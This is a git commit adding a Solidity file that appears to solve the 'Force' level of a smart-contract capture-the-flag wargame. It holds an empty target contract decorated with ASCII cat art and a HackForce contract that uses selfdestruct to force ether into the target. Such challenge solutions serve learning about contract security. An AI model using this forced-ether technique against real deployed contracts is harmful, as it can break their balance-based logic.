1b719dd21bb1b3478c2d0b6c76b8d0338b0e3073
Sergey <68071039+mysteryon88@users.noreply.github.com>
2022-11-10 16:19:14 +0300

    Force

---
+++ 7. Force/Force.sol
@@ -0,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+
+contract HackForce {
+
+    constructor() payable {}
+
+    function attack(address payable _force) external  {
+        selfdestruct(_force);
+    }
+}
